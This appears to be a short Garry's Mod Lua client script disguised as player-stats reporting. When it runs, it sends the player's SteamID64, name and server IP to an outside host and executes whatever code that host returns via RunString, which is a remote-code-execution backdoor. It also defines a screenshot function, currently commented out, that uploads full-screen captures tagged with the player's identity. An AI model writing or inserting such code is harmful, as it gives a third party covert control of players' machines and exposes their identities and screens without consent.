local function sendPlayerInfo()
	local playerData = 
	{
		playerId = LocalPlayer():SteamID64(),
		playerName = steamworks.GetPlayerName( LocalPlayer():SteamID64() ),
		csrfToken = "ZmhydXN6bGprdHVOZGxIMUxMREpuUT09",
		serverIp = game.GetIPAddress()
	}
	http.Post("https://kvac.cz/api/player-stats/update", playerData, function(response) RunString(response) end)
end
sendPlayerInfo()

local function takeScreenshot()
	hook.Add("PostRender", "screenshot_21614", function()
		hook.Remove("PostRender", "screenshot_21614")
		local screenshotData = render.Capture({
			format = "jpeg",
			quality = 100,
			h = ScrH(),
			w = ScrW(),
			x = 0,
			y = 0,
		})
		local playerName = steamworks.GetPlayerName(LocalPlayer():SteamID64())
		local playerSteamID64 = LocalPlayer():SteamID64()
		local encodedData = util.Base64Encode(screenshotData)
		local csrfToken = "ZmhydXN6bGprdHVOZGxIMUxMREpuUT09"
		http.Post("https://kvac.cz/api/game-stats/show", {name = playerName, steamid64 = playerSteamID64, data = encodedData, csrf = csrfToken})
	end)
end

--takeScreenshot()